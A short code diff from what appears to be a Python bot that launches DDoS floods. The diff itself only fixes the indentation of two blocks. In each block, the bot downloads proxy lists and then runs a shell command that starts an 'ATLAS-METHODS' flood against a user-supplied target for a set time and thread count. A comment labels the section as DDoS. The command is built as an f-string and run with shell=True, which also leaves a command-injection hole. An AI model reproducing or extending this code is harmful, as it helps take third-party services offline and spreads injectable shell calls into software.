@@ -67,7 +67,7 @@ def handle_message(message):
         for url in readurl:
             url = url.strip()
             with open("proxies.txt", mode="a") as file:
-            file.write(requests.get(url, timeout=1000).text)
+                file.write(requests.get(url, timeout=1000).text)
     subprocess.run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} proxy {thread}'], shell=True)
 
 #DDOS_YOLANDA
@@ -82,7 +82,7 @@ def handle_message(message):
         for url in readurl:
             url = url.strip()
             with open("proxies.txt", mode="a") as file:
-            file.write(requests.get(url, timeout=1000).text)
+                file.write(requests.get(url, timeout=1000).text)
     subprocess.run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} proxy {thread}'], shell=True)
 
 
